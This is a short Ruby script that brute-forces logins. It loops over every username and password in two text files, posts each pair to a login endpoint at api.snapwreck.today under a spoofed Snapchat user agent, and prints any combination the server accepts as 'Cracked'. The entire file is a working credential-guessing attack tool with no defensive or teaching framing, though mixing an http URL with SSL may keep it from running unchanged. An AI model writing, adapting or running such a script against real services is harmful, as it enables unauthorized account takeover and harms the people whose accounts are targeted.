require 'uri'
require 'net/http'
require 'net/https'
usernames = File.readlines("usernames.txt") # List Of Usernames
passwords = File.readlines("passwords.txt") # List Of Passwords
for username in usernames
	for password in passwords
		###################################
		uri = URI.parse("http://api.snapwreck.today/login/")
		https = Net::HTTP.new(uri.host,uri.port)
		https.use_ssl = true
		req = Net::HTTP::Post.new(uri.path, initheader = {
			'Accept-Language' => 'en;q=0.9',
			'User-Agent' => 'Snapchat/KillMe'
		})
		req.body = "password=#{password}&username=#{username}"
		res = https.request(req)
		###################################
		if res.code.include? "200"
			if res.body.include? "logged"
				puts "\n-----\nCracked -> (#{username}:#{password})\n-----\n"
			else
				if res.body.include? "password is incorrect"
					puts "Failed -> (""#{username}:#{password}"")\n"
				else
					if res.body.include? "Invalid account"
						puts "Invalid Account -> (#{username})\n"
					else
						puts "#{res.body}\n"
					end
				end
			end
		else
			puts "Shit ~~\n"
		end
	end
end
